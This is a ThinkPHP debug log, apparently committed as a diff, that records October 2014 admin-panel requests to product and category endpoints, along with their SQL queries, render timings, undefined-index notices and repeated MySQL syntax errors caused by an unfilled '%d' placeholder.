+SQL: SELECT * FROM `procate` WHERE ( id=23 ) LIMIT 1   [ RunTime:0.000166s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.026447s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026546s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002006s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001817s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001616s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001960s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007650s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002234s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002328s ]
+
+[ 2014-10-10 15:01:59 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=10
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002169s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002263s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001753s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001826s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004880s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=10 )  [ RunTime:0.000308s ]
+
+[ 2014-10-10 15:02:11 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002618s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002731s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002054s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002129s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004639s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000138s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:02:16 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=111
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002117s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002215s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001598s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001670s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004637s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004253s ]
+SQL: SELECT * FROM `products` WHERE ( id=111 ) LIMIT 1   [ RunTime:0.000485s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000251s ]
+SQL: SELECT * FROM `procate` WHERE ( id=23 ) LIMIT 1   [ RunTime:0.000188s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019363s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019452s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001547s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001395s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001229s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001498s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005862s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001706s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001777s ]
+
+[ 2014-10-10 15:02:16 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=10
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002597s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002694s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001592s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001656s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004459s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=10 )  [ RunTime:0.000287s ]
+
+[ 2014-10-10 15:02:19 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001990s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002081s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001601s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001669s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004553s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000146s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:02:22 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/3?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001966s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002056s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001595s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001667s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004572s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004072s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000394s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000367s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 20,10 [ RunTime:0.000536s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.027921s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.028021s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002041s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001854s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001635s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001994s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007779s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002246s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002340s ]
+
+[ 2014-10-10 15:02:23 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001960s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002045s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001590s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001655s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004612s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000140s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:02:25 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=104
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002007s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002097s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001611s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001684s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004658s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004044s ]
+SQL: SELECT * FROM `products` WHERE ( id=104 ) LIMIT 1   [ RunTime:0.000321s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000260s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000192s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.020043s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.020137s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001571s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001522s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001358s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001652s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006319s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001864s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001944s ]
+
+[ 2014-10-10 15:02:25 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=20
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001958s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002044s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001631s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001697s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004422s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=20 )  [ RunTime:0.000304s ]
+
+[ 2014-10-10 15:02:35 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001963s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002049s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001632s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001698s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004876s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000142s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:02:38 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001988s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002075s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001639s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001712s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004661s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004038s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000405s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000385s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000486s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023855s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023940s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001562s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001414s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001247s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001513s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005933s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001710s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001781s ]
+
+[ 2014-10-10 15:02:38 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002592s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002703s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002096s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002183s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004436s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000138s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:02:47 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=111
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002583s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002693s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001592s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001663s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004641s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.003951s ]
+SQL: SELECT * FROM `products` WHERE ( id=111 ) LIMIT 1   [ RunTime:0.000465s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000247s ]
+SQL: SELECT * FROM `procate` WHERE ( id=23 ) LIMIT 1   [ RunTime:0.000174s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019401s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019487s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001559s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001410s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001245s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001511s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005923s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001722s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001801s ]
+
+[ 2014-10-10 15:02:47 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=10
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002167s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002259s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001768s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001840s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.005072s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=10 )  [ RunTime:0.000313s ]
+
+[ 2014-10-10 15:03:00 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002607s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002717s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002195s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002282s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004560s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000139s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:03:03 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/3?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002631s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002756s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002164s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002272s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.005010s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004903s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000457s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000441s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 20,10 [ RunTime:0.000638s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.026273s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026366s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001759s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001597s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001410s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001702s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006683s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001920s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001999s ]
+
+[ 2014-10-10 15:03:03 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001998s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002083s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001626s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001691s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004731s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000168s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:03:05 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=104
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002592s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002704s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001613s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001685s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004562s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004380s ]
+SQL: SELECT * FROM `products` WHERE ( id=104 ) LIMIT 1   [ RunTime:0.000324s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000252s ]
+SQL: SELECT * FROM `procate` WHERE ( id=31 ) LIMIT 1   [ RunTime:0.000172s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019733s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019823s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001500s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001486s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001335s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001601s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006122s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001786s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001859s ]
+
+[ 2014-10-10 15:03:05 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=20
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002222s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002315s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001797s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001869s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004970s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=20 )  [ RunTime:0.000317s ]
+
+[ 2014-10-10 15:03:12 ] 113.73.217.156 /admin.php/Product/getAllProductList
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002058s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002144s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001690s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001764s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004835s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004094s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000381s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000367s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000430s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.028346s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.028448s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002137s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001980s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001721s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002071s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.008166s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002331s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002425s ]
+
+[ 2014-10-10 15:03:13 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001972s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002058s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001612s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001677s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004891s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000140s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:03:18 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001992s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002077s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001652s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001726s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004765s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004340s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000421s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000389s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000507s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.028481s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.028581s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002084s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001899s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001681s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002014s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007933s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002276s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002371s ]
+
+[ 2014-10-10 15:03:18 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002457s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002555s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001615s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001681s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004580s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000133s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:03:23 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=111
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001985s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002075s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001647s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001720s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004729s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004306s ]
+SQL: SELECT * FROM `products` WHERE ( id=111 ) LIMIT 1   [ RunTime:0.000469s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000270s ]
+SQL: SELECT * FROM `procate` WHERE ( id=23 ) LIMIT 1   [ RunTime:0.000190s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019807s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019894s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001583s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001436s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001270s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001541s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006026s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001751s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001824s ]
+
+[ 2014-10-10 15:03:23 ] 113.73.217.156 /admin.php/Product/selectChildProcate?id=10
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002650s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002761s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002136s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002222s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004358s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=10 )  [ RunTime:0.000274s ]
+
+[ 2014-10-10 15:05:00 ] 113.73.217.156 /admin.php/Product/addProduct
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002620s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002732s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002134s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002236s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006621s ]
+NOTIC: [8] Undefined index:  procate2 D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 268 行.
